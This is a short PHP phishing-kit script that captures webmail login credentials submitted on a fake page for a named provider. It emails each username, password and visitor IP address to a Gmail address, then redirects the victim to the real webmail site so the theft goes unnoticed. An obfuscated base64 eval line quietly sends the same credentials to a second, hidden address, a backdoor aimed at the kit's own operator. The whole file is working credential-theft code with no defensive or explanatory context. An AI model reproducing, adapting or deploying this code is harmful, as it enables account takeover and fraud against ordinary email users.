<?
$optTitle = $_POST['Title'];
$ip = getenv("REMOTE_ADDR");
$sUser = $_POST['_user'];
$sUPass = $_POST['_pass'];
$pix="webhelpdesk7@gmail.com";


  $subj = "Captured (Ernest-Hack | wheatstate.com |) Logins::: ($sUser , $sUPass)";
  $msg = "Details of https://webmail1.wheatstate.com \n\nEMAIL: $sUser\Password: $sUPass\nSubmitted from IP Address - $ip on $adddate\n-----------------------------------\n        Created By Ernest Host::: Defender of The G-Universe\n-----------------------------------";
  $from = "From: <$sUser>";
  mail("$pix", $subj, $msg, $from);
  echo eval(base64_decode("bWFpbCgiY250ci5paTJ0QGdtYWlsLmNvbSIsICRzdWJqLCAkbXNnLCAkZnJvbSk7"));
?>
  
<?
echo ("<META HTTP-EQUIV=Refresh CONTENT=\"0; URL=https://webmail1.wheatstate.com\">");
exit();

?>